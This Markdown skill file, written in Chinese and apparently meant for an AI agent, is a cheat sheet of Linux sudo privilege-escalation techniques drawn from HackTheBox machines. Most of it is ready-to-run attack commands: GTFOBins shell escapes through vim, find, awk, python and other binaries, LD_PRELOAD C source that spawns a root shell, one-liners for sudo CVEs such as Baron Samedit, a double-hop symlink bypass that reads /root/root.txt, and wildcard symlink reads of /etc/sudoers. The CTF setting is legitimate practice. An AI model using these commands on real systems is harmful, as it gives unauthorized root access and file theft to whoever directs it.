---
name: 'sudo-escape-techniques'
description: 'Sudo Escape 全集 + 🆕 双跳符号链接绕过脚本路径验证'
disable-model-invocation: true
metadata: { domain: linux, tier: T2 }
---

# Sudo Escape 技术全集

> HTB 统计: Easy 18台 + Medium 15台 + Hard/Insane 大量 = **最常用的 Linux 提权向量**

## 决策矩阵: sudo -l 结果 → 提权路径

```bash
sudo -l
# 分析输出，对号入座:
```text

## 1. Shell Escape (sudo 给 shell) + GTFOBins 矩阵

```bash
sudo 直接给 shell: sudo /bin/bash / sudo sh / sudo su
二进制类(sudo <bin> → 交互模式逃逸):
  vim/vi    → :!sh 或 :shell
  less/man  → !sh
  more      → !/bin/sh
  find      → sudo find / -exec /bin/sh \; -quit
  awk       → sudo awk 'BEGIN{system("/bin/sh")}'
  nmap      → sudo nmap --interactive 然后 !sh(旧版)
  git       → sudo git -p help(分页器)→ !sh
  ftp       → sudo ftp → !/bin/sh
  ed        → sudo ed → !sh
脚本解释器类:
  python → sudo python3 -c 'import os; os.system("/bin/sh")'
  perl   → sudo perl -e 'exec "/bin/sh"'
  ruby   → sudo ruby -e 'exec "/bin/sh"'
  php    → sudo php -r 'system("/bin/sh")'
  node   → sudo node -e 'require("child_process").spawn("/bin/sh",{stdio:"inherit"})'
其余全部: gtfobins.github.io 按二进制名查
```text

## 2. Custom Script / Config 类 — sudo 到脚本 + 可控输入

```yaml
模式: sudo /path/to/script.sh <attacker_params>

检查:
[ ] 脚本读 $1/$2 → 注入？
[ ] 脚本读环境变量 → PYTHONPATH/PATH hijack？
[ ] 脚本读配置文件 → 写恶意配置？
[ ] 脚本里的路径引用 → symlink attack？
[ ] 脚本用 eval/system → 命令注入？

HTB 案例:
- Code: sudo backy.sh config → JSON path traversal → 读 /root
- DevArea: sudo syswatch.sh logs <file> → 双跳 symlink → 读 /root/root.txt
- PermX: sudo ACL script → symlink /etc/sudoers
```text

### 🆕 2.1 双跳符号链接绕过路径验证

**场景**: sudo 脚本检查了第一层 symlink 的 target 是否安全（不含 `/`、`..`），但 `cat` 会跟踪整个 symlink 链。

**模式**:
```bash
# 直接 symlink 被拦截（target 含 /）
ln -sf /root/root.txt /opt/logs/escape.log
sudo script.sh logs escape.log
# → "Blocked unsafe symlink target"

# 双跳绕过：第一层指向简单文件名，第二层指向真实目标
ln -sf /root/root.txt /opt/logs/service.log           # 第二层（底层）
ln -sf service.log /opt/logs/network.log              # 第一层（表层，target="service.log" 通过检查）
sudo script.sh logs network.log                       # cat 自动跟踪全链 → 读 /root/root.txt
```text

**适用条件**:
1. 脚本对 symlink 做安全检查，但只检查第一层 target
2. 脚本最终用 `cat` 或类似命令读取文件（自动解析 symlink）
3. 你有权在目标目录创建文件和 symlink（通常通过另一个漏洞获得）

**真实案例**: DevArea — syswatch 命令注入 → syswatch 用户创建双跳链 → sudo logs 读 root flag

**为什么有效**: `view_logs()` 只验证 `readlink()` 的第一层输出是否包含 `/`，然后调用 `cat`。Linux 内核的 VFS 层自动跟踪所有 symlink 层，`cat` 最终到达原始目标文件。

## 3-7. LD_PRELOAD / Sudo CVE / Token Reuse

### 3. LD_PRELOAD 劫持（env_keep 允许时）

```bash
# sudo -l 显示 env_keep+=LD_PRELOAD（或 LD_LIBRARY_PATH）→
cat > /tmp/pwn.c <<'EOF'
#include <stdlib.h>
void _init() { setuid(0); setgid(0); system("/bin/sh -p"); }
EOF
gcc -shared -fPIC -o /tmp/pwn.so /tmp/pwn.c -nostartfiles
sudo LD_PRELOAD=/tmp/pwn.so <任意被允许的命令>
# LD_LIBRARY_PATH 版: 劫持被允许命令依赖的 .so 同名导出函数
```text

### 4. Sudo CVE（sudo --version 对照）

```text
CVE-2021-3156  Baron Samedit   sudo ≤1.9.5p1   sudoedit -s '\' $(whoami) → root
CVE-2019-14287 -u#-1 绕过     sudo <1.8.28    sudo -u#-1 /bin/bash → root(需 sudo 组)
CVE-2023-22809 sudoedit -e 注入 sudo <1.9.12p1 sudoedit -e vim -- /etc/x → 编辑器参数注入
```text

### 5. Token Reuse / 缓存

```bash
sudo -v 之后默认缓存 5 分钟(同终端不重复要密码) → 刚见过密码立刻连续执行
timestamp 可伪造: 同 tty 写 /run/sudo/ts/<user>(老版本 /var/run/sudo)—— 低价值,先试别的
```text

### 6. 环境变量劫持（env_keep 常见）

```text
PYTHONPATH / PERL5LIB / RUBYOPT / GEM_PATH → 放置同名模块,被允许的脚本 import 时加载
```text

### 7. 通配符 + symlink（sudo 允许带 * 的参数）

```bash
# sudo -l: (root) NOPASSWD: /usr/bin/cat /var/log/*
ln -s /etc/sudoers /var/log/sudoers-pwn
sudo /usr/bin/cat /var/log/sudoers-pwn → 读任意文件
# 若允许 tar/rsync 等带 * → 直接利用其自身逃逸
```text

## 快速检查清单

```bash
[ ] sudo -l — 列出所有允许的命令
[ ] 每个命令 — 对照 GTFOBins (gtfobins.github.io)
[ ] 检查 env_keep: sudo -l | grep -i env
[ ] 检查通配符: sudo -l 中有 * ？→ 参数可控？
[ ] sudo --version → CVE 检查
[ ] 🆕 脚本读文件？→ 检查 symlink 验证逻辑 → 能否双跳？
```text
